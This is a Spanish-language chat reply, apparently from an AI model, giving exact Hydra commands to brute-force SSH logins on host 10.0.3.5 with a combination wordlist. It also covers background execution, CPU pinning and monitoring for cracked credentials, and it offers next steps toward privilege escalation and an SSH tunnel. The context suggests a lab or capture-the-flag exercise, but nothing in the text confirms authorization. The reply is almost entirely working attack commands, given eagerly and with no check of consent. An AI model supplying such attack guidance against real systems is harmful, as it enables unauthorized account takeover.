¡Perfecto! Aquí tienes el comando exacto para **4 hilos, 2 segundos de espera, usando 1 núcleo** (Hydra por defecto usa 1 núcleo a menos que uses `-T`):

```bash
hydra -C combinaciones_espanol_2.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultados_espanol_2.txt
```

## Si quieres limitar explícitamente a 1 núcleo (por si acaso):

```bash
taskset -c 0 hydra -C combinaciones_espanol_2.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultados_espanol_2.txt
```

## También puedes ejecutarlo en background para que siga corriendo:

```bash
nohup hydra -C combinaciones_espanol_2.txt ssh://10.0.3.5 -t 4 -w 2 -v -o resultados_espanol_2.txt > hydra.log 2>&1 &

# Ver que está corriendo
ps aux | grep hydra

# Ver el log en vivo
tail -f hydra.log
```

## Para monitorear el progreso:

```bash
# Ver cuántas líneas del resultado ya se escribieron
wc -l resultados_espanol_2.txt

# Ver si encontró algo
grep -i "found\|host.*login" resultados_espanol_2.txt
```

## ¿Cuántos intentos son?

```bash
# Ver cuántas combinaciones tienes
wc -l combinaciones_espanol_2.txt

# Ejemplo: si son 10,000 combinaciones
# 10,000 / 4 hilos = 2,500 ciclos
# 2,500 ciclos × 2 segundos = 5,000 segundos ≈ 1.4 horas
```

## Si quieres ver el progreso en tiempo real (cada 30 segundos):

```bash
watch -n 30 'echo "=== RESULTADOS ENCONTRADOS ==="; grep -i "host.*login" resultados_espanol_2.txt; echo ""; echo "=== ÚLTIMAS LÍNEAS DEL LOG ==="; tail -5 hydra.log 2>/dev/null'
```

**¡Ejecuta el comando y deja que corra!** Mientras tanto, podemos pensar en la Parte 2 (escalada de privilegios) o explorar el túnel SSH que creamos antes.

¿Ya está corriendo? ¿Te muestra algo como `[STATUS] attack finished...`?